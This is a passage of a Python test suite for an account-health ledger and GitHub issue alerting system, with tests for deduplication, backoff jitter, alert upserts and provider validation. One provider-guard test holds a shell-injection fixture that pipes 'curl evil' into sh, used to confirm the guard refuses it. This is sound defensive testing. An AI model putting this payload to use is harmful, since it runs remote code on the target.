    discard records). Every assertion is non-vacuous: deleting the dedup check flips the idempotency
    block red, and flattening the backoff schedule flips the jitter block red."""
    salt, now = "s3cret", 3_000_000
    ah = account_hash("codex01", salt)
    real_sleep = globals()["_sleep_backoff"]
    globals()["_sleep_backoff"] = lambda attempt: None   # no real sleeping in the dedup paths
    try:
        # --- IDEMPOTENCY: the SAME outcome replayed is a no-op, not a duplicate -----------------
        api = _StubAPI(seed=[])
        r = make_record("openai", ah, "sol", "rate-limit", "9999.1", now)
        n1 = append_record(api, "o/r", r, now)
        # a re-run of ONLY the failed recorder replays the producing job's PRESERVED outputs: the
        # same producing-job attempt (.1 again) arrives with a fresh write-time ts — a duplicate.
        replay = make_record("openai", ah, "sol", "rate-limit", "9999.1", now + 30)
        n2 = append_record(api, "o/r", replay, now + 30)
        chk("replayed recorder (same producing attempt, fresh ts) is an idempotent no-op",
            (n1, n2, len(api.records())), (1, 1, 1))
        # ...so the derived backoff reflects ONE hit, never a falsely-escalated two
        chk("dedup keeps the derived backoff at a single consecutive hit",
            account_backoffs(api.records(), now + 60).get(ah, {}).get("consecutive"), 1)
        # a FULL workflow re-run keeps GITHUB_RUN_ID but RE-EXECUTES the producing job, which
        # stamps a fresh attempt (.1 -> .2): a genuinely new outcome — e.g. a second real
        # rate-limit — that MUST stay countable (review round 1 of #425: collapsing every attempt
        # into the run id silently dropped it, weakening backoff/outage thresholds).
        rerun = make_record("openai", ah, "sol", "rate-limit", "9999.2", now + 40)
        nre = append_record(api, "o/r", rerun, now + 40)
        chk("re-executed outcome under the SAME GITHUB_RUN_ID (fresh producing attempt) appends",
            (nre, len(api.records())), (2, 2))
        # a DISTINCT run (different GITHUB_RUN_ID) is a genuine further outcome and DOES append
        r2 = make_record("openai", ah, "sol", "rate-limit", "10000.1", now + 50)
        n3 = append_record(api, "o/r", r2, now + 50)
        chk("a distinct GITHUB_RUN_ID is a genuine hit and appends",
            (n3, len(api.records())), (3, 3))
        chk("three genuine outcomes escalate the backoff to consecutive=3",
            account_backoffs(api.records(), now + 70).get(ah, {}).get("consecutive"), 3)
        # a record with NO run_id cannot be keyed -> always appends (never falsely deduped)
        unkeyed = make_record("openai", ah, "sol", "rate-limit", "", now + 60)
        napp = append_record(_StubAPI(seed=[dict(unkeyed)]), "o/r", unkeyed, now + 60)
        chk("an unkeyed (no run_id) record is never deduped", napp, 2)
    finally:
        globals()["_sleep_backoff"] = real_sleep

    # --- BOUNDED FULL-JITTER BACKOFF SCHEDULE (deterministic, RNG split out) --------------------
    # Exponential then capped: dropping the exponent (linear) or the cap flips this red.
    chk("backoff ceiling is exponential then capped at 8 s",
        [_backoff_ceiling(a) for a in (1, 2, 3, 4, 5, 6, 10)],
        [0.5, 1.0, 2.0, 4.0, 8.0, 8.0, 8.0])
    # Full jitter: the delay must BE the RNG draw over exactly [0, ceiling]. Stubbing random.uniform
    # pins both properties — a deterministic delay would either never call the RNG or discard its
    # draw, flipping these red.
    real_uniform = random.uniform
    uniform_calls, sentinel = [], 4.2
    random.uniform = lambda lo, hi: (uniform_calls.append((lo, hi)), sentinel)[1]
    try:
        draws = [_backoff_delay(a) for a in range(1, 7)]
    finally:
        random.uniform = real_uniform
    chk("backoff delay draws uniform(0, ceiling) with exact bounds",
        uniform_calls, [(0, _backoff_ceiling(a)) for a in range(1, 7)])
    chk("backoff delay propagates the RNG draw unchanged", draws, [sentinel] * 6)
    return True


def _test_upsert(chk):
    """_upsert_alert operational idempotency (review defect #7), against a scripted fake gh:
    flap REOPENS the closed marker issue (never a duplicate create); a FAILED close posts no
    recovery comment (no next-tick spam); a confirmed close posts exactly the recovery comment."""
    import types
    global _gh
    real_gh, calls = _gh, []

    def fake_gh(open_issues, closed_issues, fail_verbs, list_fails=False):
        def run(args, token, capture=False):
            calls.append(list(args))
            if args[:2] == ["issue", "list"]:
                if list_fails:
                    return types.SimpleNamespace(returncode=1, stdout="", stderr="boom")
                state = args[args.index("--state") + 1]
                issues = open_issues if state == "open" else closed_issues
                return types.SimpleNamespace(returncode=0, stdout=json.dumps(issues), stderr="")
            verb = args[1] if args[0] == "issue" else args[0]
            return types.SimpleNamespace(returncode=1 if verb in fail_verbs else 0,
                                         stdout="", stderr="")
        return run

    def issue_verbs():
        return [c[1] for c in calls if c and c[0] == "issue"]

    marker = _marker("provider-outage", "anthropic")
    action = {"condition": "provider-outage", "provider": "anthropic", "fire": True, "reason": "r"}
    try:
        # flap: no open issue, a CLOSED marker issue exists -> REOPEN, never create
        _gh, calls[:] = fake_gh([], [{"number": 7, "body": marker}], set()), []
        chk("upsert returns True on a confirmed reopen", _upsert_alert(action, "o/r", "t", "m"), True)
        chk("upsert reopens the closed marker issue on flap", "reopen" in issue_verbs(), True)
        chk("upsert does not create a duplicate on flap", "create" in issue_verbs(), False)
        # fresh alert (no open, no closed) -> create
        _gh, calls[:] = fake_gh([], [], set()), []
        chk("upsert returns True on a confirmed create", _upsert_alert(action, "o/r", "t", "m"), True)
        chk("fresh alert creates the issue", "create" in issue_verbs(), True)
        # FAILED create -> returns False (issue #175: caller must see the failure, not exit 0)
        _gh, calls[:] = fake_gh([], [], {"create"}), []
        chk("upsert returns False on a FAILED create", _upsert_alert(action, "o/r", "t", "m"), False)
        # FAILED close -> returns False, and NO recovery comment (retries next tick)
        _gh, calls[:] = fake_gh([{"number": 8, "body": marker}], [], {"close"}), []
        chk("upsert returns False on a FAILED close",
            _upsert_alert({**action, "fire": False}, "o/r", "t", "m"), False)
        chk("failed close posts no recovery comment", "comment" in issue_verbs(), False)
        # confirmed close -> returns True + recovery comment
        _gh, calls[:] = fake_gh([{"number": 8, "body": marker}], [], set()), []
        chk("upsert returns True on a confirmed close",
            _upsert_alert({**action, "fire": False}, "o/r", "t", "m"), True)
        chk("confirmed close posts the recovery comment", "comment" in issue_verbs(), True)
        # steady no-alert with no open issue -> confirmed no-op (True), no mutation
        _gh, calls[:] = fake_gh([], [], set()), []
        chk("steady no-alert is a confirmed no-op (True)",
            _upsert_alert({**action, "fire": False}, "o/r", "t", "m"), True)
        chk("steady no-alert touches nothing", issue_verbs(), ["list"])
        # UNREADABLE tracker (list read fails) -> False and NEVER a blind create (issue #175)
        _gh, calls[:] = fake_gh([], [], set(), list_fails=True), []
        chk("unreadable tracker returns False (undelivered)",
            _upsert_alert(action, "o/r", "t", "m"), False)
        chk("unreadable tracker does NOT create over itself", "create" in issue_verbs(), False)
        # valid-but-NON-LIST list JSON ({} / null) is unreadable too, never an empty tracker
        _gh, calls[:] = fake_gh({}, [], set()), []
        chk("non-list tracker JSON ({}) returns False (undelivered)",
            _upsert_alert(action, "o/r", "t", "m"), False)
        chk("non-list tracker JSON ({}) does NOT create over itself",
            "create" in issue_verbs(), False)
        _gh, calls[:] = fake_gh(None, [], set()), []
        chk("null tracker JSON returns False (undelivered)",
            _upsert_alert(action, "o/r", "t", "m"), False)
        chk("null tracker JSON does NOT create over itself", "create" in issue_verbs(), False)
        # reopen lands but the body refresh FAILS -> False (stale body is not the desired state)
        _gh, calls[:] = fake_gh([], [{"number": 7, "body": marker}], {"edit"}), []
        chk("upsert returns False when reopen succeeds but the edit fails",
            _upsert_alert(action, "o/r", "t", "m"), False)
    finally:
        _gh = real_gh
    return True


def _test_lookup_pagination(chk):
    """_find_marker_issue is an AUTHORITATIVE, paginated lookup (#203): it reads up to
    ALERT_LOOKUP_CAP issues (gh paginates the API to fill --limit, far past the old 50-issue
    window), and a result AT the cap is treated as possibly truncated and RAISED — a failed OR
    truncated read must never be mistaken for 'not found' and let a duplicate be minted over an
    unseen marker. The cap assertion + the full-window raise both go RED on the pre-fix
    --limit-50, no-truncation-guard code."""
    import types
    global _gh
    real_gh, calls = _gh, []

    def fake_gh(issues):
        def run(args, token, capture=False):
            calls.append(list(args))
            return types.SimpleNamespace(returncode=0, stdout=json.dumps(issues), stderr="")
        return run

    marker = _marker("provider-outage", "anthropic")
    try:
        # the lookup asks for the authoritative cap, not the old 50-issue window
        _gh, calls[:] = fake_gh([]), []
        _find_marker_issue("o/r", "t", marker, "open")
        limit = calls[0][calls[0].index("--limit") + 1]
        chk("lookup requests the authoritative cap, not 50", limit, str(ALERT_LOOKUP_CAP))

        # a marker sitting BEYOND the old 50-issue window is still found (paginated)
        window = [{"number": i, "body": f"decoy-{i}"} for i in range(120)]
        window[110]["body"] = marker
        _gh = fake_gh(window)
        chk("marker beyond the old 50-window is found",
            _find_marker_issue("o/r", "t", marker, "closed"), 110)

        # a FULL window (cap items, no marker) is possibly truncated -> RAISE, never 'not found'
        full = [{"number": i, "body": f"decoy-{i}"} for i in range(ALERT_LOOKUP_CAP)]
        _gh = fake_gh(full)
        chk("full window raises (a truncated read is not 'not found')",
            _raises(lambda: _find_marker_issue("o/r", "t", marker, "closed")), True)
    finally:
        _gh = real_gh
    return True


def _test_open_markers(chk):
    """_open_alert_markers extracts every open (condition, provider) pair and FAILS OPEN to the
    empty set on any unreadable/garbled/possibly-truncated list (issue #205) — the orphan recovery
    it feeds only closes stale alerts, so a fabricated 'open' here would invent a recovery, while a
    missed read merely defers one to the next tick."""
    import types
    global _gh
    real_gh = _gh

    def fake_gh(returncode=0, stdout=None, issues=None):
        payload = stdout if stdout is not None else json.dumps(issues or [])

        def run(args, token, capture=False):
            return types.SimpleNamespace(returncode=returncode, stdout=payload, stderr="")
        return run

    try:
        _gh = fake_gh(issues=[{"body": _marker("zero-dispatch", "fleet")},
                              {"body": _marker("provider-outage", "anthropic")},
                              {"body": "unrelated issue, no marker"}])
        chk("open markers enumerated from the tracker",
            _open_alert_markers("o/r", "t"),
            {("zero-dispatch", "fleet"), ("provider-outage", "anthropic")})
        _gh = fake_gh(returncode=1)
        chk("a failed list fails open to empty (no fabricated recovery)",
            _open_alert_markers("o/r", "t"), set())
        _gh = fake_gh(stdout="{not json")
        chk("garbled list JSON fails open to empty", _open_alert_markers("o/r", "t"), set())
        _gh = fake_gh(stdout="{}")
        chk("non-list list JSON fails open to empty", _open_alert_markers("o/r", "t"), set())
        _gh = fake_gh(issues=[{"body": _marker("zero-dispatch", "fleet")}] * ALERT_LOOKUP_CAP)
        chk("a full (possibly truncated) window fails open to empty",
            _open_alert_markers("o/r", "t"), set())
    finally:
        _gh = real_gh
    return True


def _test_record_exit(chk):
    """_cmd_record exits NONZERO when the CAS write is exhausted (review defect #8) — the record
    call sites are separate always()-guarded jobs, so the failure is visible, never silent."""
    import argparse as _ap
    global GitHubAPI
    real_api = GitHubAPI
    saved = {k: os.environ.get(k) for k in
             ("REGISTRY_REPO", "WORKER_ACCOUNT_HANDLE", "PROVENANCE_SALT",
              "GH_TOKEN", "REGISTRY_ALERT_TOKEN")}

    class _ExhaustAPI:
        def __init__(self, token):
            pass

        def request(self, method, path, body=None, allow_404=False, retry_conflict=False):
            if method == "GET":
                return None    # empty ledger; every PUT below loses the CAS race
            raise HealthConflict("stub: permanent CAS contention")

    real_sleep = globals()["_sleep_backoff"]
    globals()["_sleep_backoff"] = lambda attempt: None   # never sleep the jittered backoff in-test
    try:
        os.environ.update(REGISTRY_REPO="o/r", WORKER_ACCOUNT_HANDLE="acct01",
                          PROVENANCE_SALT="s3cret", GH_TOKEN="tok")
        GitHubAPI = _ExhaustAPI
        args = _ap.Namespace(provider="anthropic", account="", model_alias="fable",
                             exit_class="auth", run_id="1", reset_hint=None)
        chk("record exits nonzero on CAS exhaustion", _cmd_record(args), 1)
    finally:
        GitHubAPI = real_api
        globals()["_sleep_backoff"] = real_sleep
        for k, v in saved.items():
            if v is None:
                os.environ.pop(k, None)
            else:
                os.environ[k] = v
    return True


def _test_record_salting_config(chk):
    """#215: missing salting inputs fail visibly and write NOTHING; complete configuration still
    records. The record call sites isolate this nonzero exit, preserving pipeline liveness."""
    import argparse as _ap
    global GitHubAPI
    real_api = GitHubAPI
    saved = {k: os.environ.get(k) for k in
             ("REGISTRY_REPO", "WORKER_ACCOUNT_HANDLE", "PROVENANCE_SALT",
              "GH_TOKEN", "REGISTRY_ALERT_TOKEN")}

    class _CountingAPI:
        put_count = 0

        def __init__(self, token):
            pass

        def request(self, method, path, body=None, allow_404=False, retry_conflict=False):
            if method == "GET":
                return {"object": {"sha": "b"}} if "git/ref/heads" in path else None
            _CountingAPI.put_count += 1
            return {"content": {"sha": "deadbeef"}}

    args = _ap.Namespace(provider="anthropic", account="", model_alias="fable",
                         exit_class="auth", run_id="1", reset_hint=None)
    try:
        os.environ.update(REGISTRY_REPO="o/r", GH_TOKEN="tok")
        GitHubAPI = _CountingAPI
        os.environ.pop("WORKER_ACCOUNT_HANDLE", None)
        os.environ["PROVENANCE_SALT"] = "s3cret"
        chk("record exits nonzero without account handle", _cmd_record(args), 1)
        chk("missing account handle writes NO record", _CountingAPI.put_count, 0)
        os.environ["WORKER_ACCOUNT_HANDLE"] = "acct01"
        os.environ.pop("PROVENANCE_SALT", None)
        chk("record exits nonzero without provenance salt", _cmd_record(args), 1)
        chk("missing provenance salt writes NO record", _CountingAPI.put_count, 0)
        os.environ["PROVENANCE_SALT"] = "s3cret"
        chk("record accepts complete salting configuration", _cmd_record(args), 0)
        chk("complete salting configuration writes one record", _CountingAPI.put_count, 1)
    finally:
        GitHubAPI = real_api
        for k, v in saved.items():
            if v is None:
                os.environ.pop(k, None)
            else:
                os.environ[k] = v
    return True


def _test_record_provider_guard(chk):
    """#199: _cmd_record REFUSES a catalog-controlled provider outside VALID_RECORD_PROVIDERS and
    writes NOTHING, while a known provider still records. Non-vacuous: the injection-shaped provider
    must return 1 with the ledger writer NEVER touched (put_count stays 0), and the valid provider
    must return 0 with exactly one write — so deleting the guard flips BOTH assertions red.
    Review round 1 of #423: the provider/class PAIRING is enforced too — `fleet` with a
    per-account class and a real provider with `zero-dispatch` are both refused without a write,
    while every legitimate fleet class (zero-dispatch/claim-abort/success) still records."""
    import argparse as _ap
    global GitHubAPI
    real_api = GitHubAPI
    saved = {k: os.environ.get(k) for k in
             ("REGISTRY_REPO", "WORKER_ACCOUNT_HANDLE", "PROVENANCE_SALT",
              "GH_TOKEN", "REGISTRY_ALERT_TOKEN")}

    class _CountingAPI:
        put_count = 0

        def __init__(self, token):
            pass

        def request(self, method, path, body=None, allow_404=False, retry_conflict=False):
            if method == "GET":
                # branch exists (present ref) but the ledger FILE does not yet -> seed empty window
                return {"object": {"sha": "b"}} if "git/ref/heads" in path else None
            _CountingAPI.put_count += 1
            return {"content": {"sha": "deadbeef"}}

    def _rec(provider, exit_class="auth", reset_hint=None):
        return _ap.Namespace(provider=provider, account="", model_alias="fable",
                             exit_class=exit_class, run_id="1", reset_hint=reset_hint)

    try:
        os.environ.update(REGISTRY_REPO="o/r", WORKER_ACCOUNT_HANDLE="acct01",
                          PROVENANCE_SALT="s3cret", GH_TOKEN="tok")
        GitHubAPI = _CountingAPI
        # A provider carrying shell metacharacters is exactly the exploit string from #199.
        _CountingAPI.put_count = 0
        chk("record refuses shell-injection provider",
            _cmd_record(_rec('x"; curl evil | sh; echo "')), 1)
        chk("refused provider writes NO record", _CountingAPI.put_count, 0)
        # A plausible-but-unknown provider is refused too (not just the metacharacter case).
        chk("record refuses unknown provider", _cmd_record(_rec("anthropi")), 1)
        chk("unknown provider writes NO record", _CountingAPI.put_count, 0)
        # A known provider is NOT blocked by the guard — it records exactly once.
        chk("record accepts known provider", _cmd_record(_rec("anthropic")), 0)
        chk("known provider writes one record", _CountingAPI.put_count, 1)
        # Provider/class pairing (review round 1 of #423): `fleet` with an ordinary per-account
        # class is refused — it would write a sentinel-account record that corrupts per-account
        # health classification.
        chk("record refuses fleet with per-account class", _cmd_record(_rec("fleet")), 1)
        chk("fleet+auth writes NO record", _CountingAPI.put_count, 1)
        # ...and the fleet-only zero-dispatch classes are refused on a real provider.
        chk("record refuses real provider with zero-dispatch",
            _cmd_record(_rec("anthropic", "zero-dispatch")), 1)
        chk("record refuses real provider with claim-abort",
            _cmd_record(_rec("openai", "claim-abort")), 1)
        # [#341] `idle` is a fleet-only signal for the same reason: an empty READY FRONTIER is a
        # property of the dispatcher, not of one account's model access.
        chk("record refuses real provider with idle",
            _cmd_record(_rec("anthropic", "idle")), 1)
        chk("real-provider zero-dispatch/idle writes NO record", _CountingAPI.put_count, 1)
        # Every legitimate fleet call site (dispatch.yml: zero tick, claim abort, tick-run-resetting
        # success) still records — one write each.
        chk("record accepts fleet zero-dispatch", _cmd_record(_rec("fleet", "zero-dispatch")), 0)
        chk("fleet zero-dispatch writes one record", _CountingAPI.put_count, 2)
        chk("record accepts fleet claim-abort", _cmd_record(_rec("fleet", "claim-abort")), 0)
        chk("record accepts fleet success", _cmd_record(_rec("fleet", "success")), 0)
        chk("fleet claim-abort+success each write one record", _CountingAPI.put_count, 4)
        chk("record expands the numeric-only no_change worker handoff",
            _cmd_record(_rec("openai", "no_change",
                             "no-change-v1 issue:500,input:390000,output:1200,wall:78")), 0)
        chk("valid no_change handoff writes one record", _CountingAPI.put_count, 5)
        chk("record rejects malformed no_change handoff",
            _cmd_record(_rec("openai", "no_change", "no-change-v1 issue:500,input:not-a-number")),
            1)
        chk("malformed no_change handoff writes NO record", _CountingAPI.put_count, 5)
        # [#701] the why_no_diff reason travels the SAME sanitized handoff, as an index.
        chk("record expands a declared why_no_diff reason",
            _cmd_record(_rec("openai", "no_change", "no-change-v1 issue:500,why:1")), 0)
        chk("declared-reason handoff writes one record", _CountingAPI.put_count, 6)
        chk("record REFUSES an out-of-vocabulary reason index",
            _cmd_record(_rec("openai", "no_change",
                             f"no-change-v1 issue:500,why:{len(NO_CHANGE_REASONS)}")), 1)
        chk("a forged reason index writes NO record", _CountingAPI.put_count, 6)
    finally:
        GitHubAPI = real_api
        for k, v in saved.items():
            if v is None:
                os.environ.pop(k, None)
            else:
                os.environ[k] = v
    return True


def _test_fleet_idle_gate(chk):
    """[#341] The empty-frontier (`idle`) record and its NON-FLOODING write gate, both directions.

    Two halves, each with its own failure mode:
      * the PURE gate (fleet_idle_is_redundant) — it must suppress ONLY a provably-redundant
        repeat: the newest FLEET record, inside the window, already `idle`;
      * the WRITE path (_cmd_record end-to-end against a stateful ledger stub) — the first idle
        record of a quiet stretch lands, the second does not, and NO OTHER CLASS is gated. That
        last one is the dangerous mutant: widening the gate to every class would silently collapse
        the consecutive zero-dispatch ticks the alert is counted from into a single record.
    """
    import argparse as _ap
    import types
    global GitHubAPI, _gh
    real_api, real_gh = GitHubAPI, _gh
    saved = {k: os.environ.get(k) for k in
             ("REGISTRY_REPO", "WORKER_ACCOUNT_HANDLE", "PROVENANCE_SALT",
              "GH_TOKEN", "REGISTRY_ALERT_TOKEN")}
    salt, base = "s3cret", 5_000_000
    sentinel = hashlib.sha256(b"fleet-zero-dispatch").hexdigest()[:16]

    def frec(cls, dt, run):
        return make_record(FLEET_PSEUDO_PROVIDER, sentinel, "", cls, run, base + dt)

    # ---- the PURE gate -----------------------------------------------------------------------
    # The bounds FIRST, from literals, so the fixtures below can be sized from literals too: a
    # fixture derived from the constant it is probing shrinks with the constant and stays green.
    chk("the window/skew bounds this gate reuses are the documented ones",
        (WINDOW_SECONDS, FUTURE_SKEW_SECONDS), (48 * 3600, 300))
    chk("idle gate: an empty ledger is never redundant (the first idle always writes)",
        fleet_idle_is_redundant([], base), False)
    chk("idle gate: the fleet's newest record already being idle IS redundant",
        fleet_idle_is_redundant([frec(CLASS_IDLE, 0, "a")], base + 60), True)
    chk("idle gate: a newer zero-dispatch tick makes the next idle record non-redundant",
        fleet_idle_is_redundant([frec(CLASS_IDLE, 0, "a"), frec(CLASS_ZERO_DISPATCH, 60, "b")],
                                base + 120), False)
    chk("idle gate: a newer dispatch success makes the next idle record non-redundant",
        fleet_idle_is_redundant([frec(CLASS_IDLE, 0, "a"), frec(SUCCESS, 60, "b")],
                                base + 120), False)
    # ORDER, not position: the newest record is found by TIMESTAMP, so an unsorted ledger (prune
    # sorts, but this reads the RAW ledger the CAS writer just fetched) cannot fool the gate.
    chk("idle gate: newest-by-TIMESTAMP, not by list position",
        fleet_idle_is_redundant([frec(CLASS_ZERO_DISPATCH, 60, "b"), frec(CLASS_IDLE, 0, "a")],
                                base + 120), False)
    # SAME-SECOND TIE. Record stamps are write-time integers, so two ticks CAN collide; `newest`
    # must then mean "last appended", which is what classify_records' stable sort yields. A `max()`
    # takes the FIRST of the tied records and would suppress a write the classifier has already
    # moved past — measured: this exact pair silently dropped an idle record on the first cut.
    chk("idle gate: a same-second tie resolves by append order (idle, then zero-dispatch)",
        fleet_idle_is_redundant([frec(CLASS_IDLE, 0, "a"), frec(CLASS_ZERO_DISPATCH, 0, "b")],
                                base + 60), False)
    chk("idle gate: a same-second tie resolves by append order (zero-dispatch, then idle)",
        fleet_idle_is_redundant([frec(CLASS_ZERO_DISPATCH, 0, "b"), frec(CLASS_IDLE, 0, "a")],
                                base + 60), True)
    # WINDOW: an idle record that has already aged out is invisible to classify_records, so it must
    # not suppress a write here either — otherwise the quiet fleet ends up with NO in-window
    # evidence at all. 49 h is a literal, deliberately not WINDOW_SECONDS + something.
    chk("idle gate: an idle record older than the window no longer suppresses the write",
        fleet_idle_is_redundant([frec(CLASS_IDLE, 0, "a")], base + 49 * 3600), False)
    # ...and an implausibly FUTURE-stamped idle (a forged/clock-skewed record that would otherwise
    # never age out) is dropped by the same rule prune applies, so it cannot mute the fleet.
    chk("idle gate: a future-stamped idle record cannot suppress the write",
        fleet_idle_is_redundant([frec(CLASS_IDLE, 600, "a")], base), False)
    # PROVIDER FILTER: only the FLEET's own records speak for the fleet. Dropping the filter makes
    # the per-account record below the newest one and flips this to False.
    chk("idle gate: a newer PER-ACCOUNT record does not un-redundant the fleet's idle state",
        fleet_idle_is_redundant(
            [frec(CLASS_IDLE, 0, "a"),
             make_record("anthropic", account_hash("acct01", salt), "sonnet", SUCCESS, "b",
                         base + 60)],
            base + 120), True)

    # ---- the WRITE path, end-to-end through _cmd_record ---------------------------------------
    stub = _StubAPI(seed=[])

    def _rec(provider, exit_class, run):
        return _ap.Namespace(provider=provider, account="", model_alias="",
                             exit_class=exit_class, run_id=run, reset_hint=None)

    try:
        os.environ.update(REGISTRY_REPO="o/r", WORKER_ACCOUNT_HANDLE="acct01",
                          PROVENANCE_SALT=salt, GH_TOKEN="tok")
        GitHubAPI = lambda token: stub                       # noqa: E731 — one-line test double
        chk("record accepts the fleet idle class", _cmd_record(_rec("fleet", "idle", "1")), 0)
        chk("the first idle tick of a quiet stretch WRITES", len(stub.records()), 1)
        chk("a real provider may NOT claim the fleet idle class",
            _cmd_record(_rec("anthropic", "idle", "2")), 1)
        chk("the refused per-account idle record never reaches the ledger",
            len(stub.records()), 1)
        # THE GATE. A second idle tick is a successful no-op: exit 0 (the tick is healthy, not a
        # failed record) and NO new record. Deleting the skip_if wiring flips the count assertion.
        chk("a repeated idle tick still exits 0", _cmd_record(_rec("fleet", "idle", "3")), 0)
        chk("a repeated idle tick writes NOTHING (the non-flooding gate)",
            len(stub.records()), 1)
        # ...and the gate re-opens the moment the fleet says something else, so the NEXT transition
        # into quiet is recorded and can recover the alert.
        chk("a zero-dispatch tick still writes", _cmd_record(_rec("fleet", "zero-dispatch", "4")),
            0)
        chk("zero-dispatch after idle writes one record", len(stub.records()), 2)
        chk("the idle after a zero-dispatch tick writes again",
            (_cmd_record(_rec("fleet", "idle", "5")), len(stub.records())), (0, 3))
        # THE NARROWNESS OF THE GATE — the mutant that would break the alert itself. Two
        # consecutive zero-dispatch ticks must BOTH land, or the consecutive-tick run the
        # zero-dispatch alert counts could never reach ZERO_DISPATCH_MIN.
        chk("consecutive zero-dispatch ticks are NOT gated (both records land)",
            (_cmd_record(_rec("fleet", "zero-dispatch", "6")),
             _cmd_record(_rec("fleet", "zero-dispatch", "7")),
             len(stub.records())), (0, 0, 5))
        # ...nor is a repeated dispatch SUCCESS (the productive tick's own signal).
        chk("consecutive dispatch successes are NOT gated (both records land)",
            (_cmd_record(_rec("fleet", "success", "8")),
             _cmd_record(_rec("fleet", "success", "9")),
             len(stub.records())), (0, 0, 7))
        # END-TO-END: the ledger the gate produced is exactly the one classify_records needs — one
        # idle record at the tail is enough to recover, and it is the ONLY idle at the tail.
        tail = [r["exit_class"] for r in stub.records()]
        chk("the gated ledger holds one idle per transition into quiet, not one per tick",
            tail.count(CLASS_IDLE), 2)
    finally:
        GitHubAPI = real_api
        for k, v in saved.items():
            if v is None:
                os.environ.pop(k, None)
            else:
                os.environ[k] = v

    # ---- WHAT THE RECOVERY DELIVERS INTO ------------------------------------------------------
    # The headline of #341 is not "classify_records returns fire=False", it is "the open alert
    # CLOSES". Assert that against the EVIDENCE path end to end: the ledger a quiet fleet produces
    # -> the real classifier -> the real upsert -> a gh `issue close` on the marker issue. A
    # recovery that stopped one layer short would leave the alert open exactly as before.
    calls = []

    def _fake_gh(open_issues):
        def run(args, token, capture=False):
            calls.append(list(args))
            if args[:2] == ["issue", "list"]:
                state = args[args.index("--state") + 1]
                return types.SimpleNamespace(
                    returncode=0, stdout=json.dumps(open_issues if state == "open" else []),
                    stderr="")
            return types.SimpleNamespace(returncode=0, stdout="", stderr="")
        return run

    quiet_window = ([frec(CLASS_ZERO_DISPATCH, i * 60, f"z{i}") for i in range(3)]
                    + [frec(CLASS_IDLE, 300, "z9")])
    recovery = _action_for(classify_records(quiet_window, {}, base + 360),
                           "zero-dispatch", FLEET_PSEUDO_PROVIDER)
    try:
        _gh, calls[:] = _fake_gh([{"number": 41,
                                   "body": _marker("zero-dispatch", FLEET_PSEUDO_PROVIDER)}]), []
        confirmed = _upsert_alert(recovery, "o/r", "t", "m")
        verbs = [c[1] for c in calls if c and c[0] == "issue"]
        chk("the idle-driven recovery CLOSES the open zero-dispatch alert issue",
            (recovery["fire"], confirmed, "close" in verbs, "create" in verbs),
            (False, True, True, False))
    finally:
        _gh = real_gh
    return True


def _test_decide_exit(chk):
    """_cmd_decide exits NONZERO when the ledger cannot be read (review r3) — every ledger
    reader fails LOUD; groom.yml's continue-on-error keeps the sweep alive while the step
    goes red, so this must never be softened back to warn-and-exit-0."""
    import argparse as _ap
    global GitHubAPI
    real_api = GitHubAPI
    saved = {k: os.environ.get(k) for k in ("REGISTRY_REPO", "GH_TOKEN")}
    try:
        os.environ.update(REGISTRY_REPO="o/r", GH_TOKEN="tok")
        GitHubAPI = lambda token: _StubAPI(seed=None, branch_missing=True)
        chk("decide exits nonzero on an unreadable ledger",
            _cmd_decide(_ap.Namespace(policy_file="policy/repos.toml")), 1)
    finally:
        GitHubAPI = real_api
        for k, v in saved.items():
            if v is None:
                os.environ.pop(k, None)
            else:
                os.environ[k] = v
    return True


def _test_routing(chk):
    saved = {k: os.environ.get(k) for k in
             ("REGISTRY_REPO", "ALERT_REPO", "ALERT_TOKEN", "REGISTRY_ALERT_TOKEN", "GH_TOKEN")}
    try:
        os.environ["REGISTRY_REPO"] = "jeswr/agent-account-registry"
        os.environ.pop("GH_TOKEN", None)
        os.environ["REGISTRY_ALERT_TOKEN"] = "amb"
        # private repo + token -> route private
        os.environ["ALERT_REPO"] = "jeswr/agent-account-data"
        os.environ["ALERT_TOKEN"] = "priv"
        chk("route private when repo+token", _alert_target(), ("jeswr/agent-account-data", "priv"))
        # #39: ALERT_REPO set, NO token -> fall back to the registry repo + ambient token (not silent)
        os.environ["ALERT_TOKEN"] = ""
        chk("route falls back to registry when token absent (#39)",
            _alert_target(), ("jeswr/agent-account-registry", "amb"))
        # no ALERT_REPO at all -> registry repo
        os.environ.pop("ALERT_REPO", None)
        chk("route registry when no ALERT_REPO",
            _alert_target(), ("jeswr/agent-account-registry", "amb"))
    finally:
        for k, v in saved.items():
            if v is None:
                os.environ.pop(k, None)
            else:
                os.environ[k] = v
    return True


def _test_delivery(chk):
    """Issue #175: a nonempty-but-unusable ALERT_TOKEN must NOT silently drop alerts. The private
    route failing retries the salted alert on the public registry with the ambient token; only when
    NEITHER route delivers is the action reported undelivered (caller then exits nonzero). A
    fake gh keyed on (token, repo) proves the retry hits the REGISTRY with the AMBIENT token."""
    import types
    global _gh
    real_gh, calls = _gh, []

    def fake_gh(bad_tokens):
        def run(args, token, capture=False):
            repo = args[args.index("-R") + 1] if "-R" in args else None
            calls.append((args[0], args[1] if args[0] == "issue" else None, token, repo))
            if args[:2] == ["issue", "list"]:
                # list reads always succeed and return empty (fresh -> create path)
                return types.SimpleNamespace(returncode=0, stdout="[]", stderr="")
            rc = 1 if token in bad_tokens else 0
            return types.SimpleNamespace(returncode=rc, stdout="", stderr="")
        return run

    def creates():
        return [(t, r) for (v, sub, t, r) in calls if sub == "create"]

    saved = {k: os.environ.get(k) for k in
             ("REGISTRY_REPO", "ALERT_REPO", "ALERT_TOKEN", "REGISTRY_ALERT_TOKEN", "GH_TOKEN")}
    fire = {"condition": "provider-outage", "provider": "anthropic", "fire": True, "reason": "r"}
    try:
        os.environ["REGISTRY_REPO"] = "jeswr/agent-account-registry"
        os.environ["REGISTRY_ALERT_TOKEN"] = "amb"
        os.environ.pop("GH_TOKEN", None)
        os.environ["ALERT_REPO"] = "jeswr/agent-account-data"
        os.environ["ALERT_TOKEN"] = "priv"

        # (a) private token UNUSABLE, ambient usable -> retried on the registry, delivered
        _gh, calls[:] = fake_gh({"priv"}), []
        undelivered = _deliver_alerts([fire], "m")
        chk("unusable private token: alert delivered via the registry fallback", undelivered, [])
        chk("fallback create targets the REGISTRY with the AMBIENT token",
            ("amb", "jeswr/agent-account-registry") in creates(), True)
        chk("private route was attempted first (priv token create tried)",
            ("priv", "jeswr/agent-account-data") in creates(), True)

        # (b) BOTH routes unusable -> reported undelivered (caller exits nonzero)
        _gh, calls[:] = fake_gh({"priv", "amb"}), []
        undelivered = _deliver_alerts([fire], "m")
